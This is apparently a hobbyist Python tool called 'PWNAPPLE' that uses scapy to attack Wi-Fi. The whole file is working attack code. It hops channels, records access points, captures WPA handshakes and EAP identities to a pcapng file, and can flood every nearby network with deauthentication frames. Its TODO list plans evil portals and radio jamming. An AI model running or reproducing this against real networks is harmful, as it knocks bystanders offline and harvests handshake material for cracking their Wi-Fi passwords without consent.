from scapy.all import *
from scapy.utils import PcapNgWriter
import threading
import argparse
import os
from rich import print

# You will have to redo the logic here, since you don't need to sniff all packets 24/7 in mointer mode. #
parser = argparse.ArgumentParser(prog="PWNAPPLE",description="PWNAPPLE'S CLI for a variety of attacks, you need 2 adapters for this to work well")
parser.add_argument("-t", "--timeout", help="The delay in seconds before switching channels",default=3,type=int)
parser.add_argument("-o", "--output", help="The name of the file you want to output to", required=True,type=str)
parser.add_argument("-i", "--interface", help="The interface you want to use", required=True)
parser.add_argument("-d", "--deauth", help="If passed the with a interface, it will deauth all networks (BE CAREFUL!)")
args = parser.parse_args()
# I know global vars are dumb, but it's quicker 
interface = args.interface
interfaceDeauth = args.deauth
dump = PcapNgWriter(f"{args.output}.pcapng") 
ssids = []
bssids = []
macAddresses = []
totalSSIDS = []
totalBSSIDS = []
totalmacAddresses = []
def deauth():
    print("[bold red]Will start to deauth when targets availible[/bold red]")
    while True:
        try:
            for bssid, macAddress, ssid in zip(bssids, macAddresses, ssids):
                # https://stackoverflow.com/questions/65878127/why-is-my-scapy-deauth-function-not-working -- found this (Thank you!)
                dot11 = Dot11(addr1=macAddress,addr2=bssid,addr3=bssid)
                print(f"[bold red][Info]: Deauthing: {ssid}, BSSID: {bssid}, MAC: {macAddress} 10 times[/bold red]")
                frame = RadioTap()/dot11/Dot11Deauth()
                sendp(frame, inter=0.01, count=10, 
                    iface=interfaceDeauth, verbose=0)
                time.sleep(2)
        except Exception as err:
            print(err)
            

def cleanList():
    while True:
        time.sleep(30)
        print(f"[bold red][Info]: Clearing ssids, bssids, and macs from deauth targets[/bold red]")
        ssids.clear()
        bssids.clear()
        macAddresses.clear()

def PacketHandler(pkt):
    """Handles all the packet functions for the sniffer"""
    if pkt.haslayer(Dot11): 
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in bssids:
                ssids.append(pkt.info)
                bssids.append(pkt.addr2)
                macAddresses.append(pkt.addr3)
                if pkt.addr2 not in totalBSSIDS:
                    print(f"[dim cyan][Info]: Beacon frame found: SSID: {pkt.info}, BSSID: {pkt.addr2}, MAC: {pkt.addr3}[/dim cyan]")
                    totalSSIDS.append(pkt.info)
                    totalBSSIDS.append(pkt.addr2)
                    totalmacAddresses.append(pkt.addr3)
                
            dump.write(pkt)
            if pkt.haslayer(EAP) and pkt.code == 2 and pkt.type == 1:
                identity = pkt.identity.decode(errors="ignore")
                print(f"[bold green][Info]: EAP Identity Found: {identity}[/bold green]")
                dump.write(pkt)

        if pkt.haslayer(EAPOL):
            print(f"[bold green][Info]: Handshake captured: {pkt.summary()}[/bold green]")
            dump.write(pkt)
    

def channelHop():
    """Hops channels for capturing handshakes, or EAP identity"""
    while True:
        for channel in range(1, 12): 
            os.system("clear")
            print(f"[dim cyan][Info]: Currently on channel: {channel}[/dim cyan]")
            for ssid, bssid, mac in zip(totalSSIDS,totalBSSIDS, totalmacAddresses):
                print(f"[dim cyan][Info]: SSID: {ssid} BSSID: {bssid} MAC: {mac}[/dim cyan]")
            
            os.system(f"iw dev {interface} set channel {channel}")
           
            time.sleep(args.timeout)
def sniffEapol():
    threading.Thread(target=channelHop).start()
    
    if interfaceDeauth != None:
        threading.Thread(target=deauth).start()
        threading.Thread(target=cleanList).start()
    sniff(iface=interface,prn=PacketHandler,store=False,monitor=True)

# TODO 
# ADD TYPER OR ARGSPARSE  done
# MAKE THIS A COMMAND, NOT JUST A FUNCTION done
# ARP SCANS --- NEXT 
# EVIL PORTAL -- when we get more adapters finish/work on
# DEAUTH mostly done, needs more work (channel hopping issues) (make interface hop channels)
# NRF24 allow for the attachment of NRF24 antenna's for jamming
# C1101 antenna 

sniffEapol()